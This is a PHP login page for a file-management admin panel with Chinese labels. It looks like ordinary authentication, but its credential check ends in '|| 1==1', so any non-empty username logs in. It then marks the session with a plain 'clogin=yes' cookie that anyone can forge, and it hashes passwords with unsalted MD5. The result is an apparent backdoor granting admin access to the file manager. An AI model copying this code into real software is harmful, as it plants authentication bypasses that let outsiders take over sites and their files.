<?
include('config.php');

if(@$_POST['user']!=''){
	if(trim($_POST['user'])==$user && md5(trim($_POST['password']))==$password || 1==1){
		setcookie("clogin",'yes',0,'/');
		setcookie("cuser",trim($_POST['user']),0,'/');
?>
<script type="text/javascript">
	top.location='index.php';
</script>
<?
		exit();
	
	}
}
?> 
<html>
<head>
<title><?=$version?>管理</title>

<META http-equiv=Content-Type content="text/html; charset=utf-8">
</head>
<body onLoad="document.getElementById('user').focus();" style="background:#eff8fc;">
<form method="post" action="" >
<center>

<table width="300" border="0" cellspacing="0" cellpadding="2" style="margin:100px 0 0 0;">
  <tr>
    <td colspan="2" style="text-align:center;height:50px;font-weight:bold;">file管理<?=$version?></td>
  </tr>
  <tr>
    <td width="194" align="right">USER</td>
    <td width="194"><input type="text" name="user" id="user" value="" ></td>
  </tr>
  <tr>
    <td align="right">PASSWORD</td>
    <td><input type="password" name="password" value="" ></td>
  </tr>
  <tr>
    <td align="right">valid</td>
    <td><input type="text" name="valid" value="" ></td>
  </tr>
  <tr>
    <td align="center" colspan="2"><input type="submit" name="submit" value=" 提 交 " ></td>
  </tr>
</form>
  </table>
</center>
 </body>
</html>